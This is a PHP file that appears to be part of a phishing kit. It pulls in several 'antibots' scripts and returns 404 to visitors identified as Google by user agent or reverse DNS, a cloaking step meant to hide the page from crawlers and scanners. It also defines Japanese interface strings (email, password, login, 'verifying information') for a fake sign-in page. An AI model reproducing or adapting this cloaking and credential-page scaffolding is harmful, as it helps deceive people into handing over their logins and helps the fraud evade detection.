<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="入力された情報を確認し、もう一度お試しください。";
$Email= "メールアドレス";
$Password = "パスワード";
$dok = "ログイン";
$req1 = "必須";
$req2 = '必須';
$forgot ="ログインできない場合";
$sign = "新規登録";
$checking = "情報を認証中...";
$priva = "プライバシー";
$ri8 = "All rights reserved";
$legal = "規約";
// fin connexioon
?>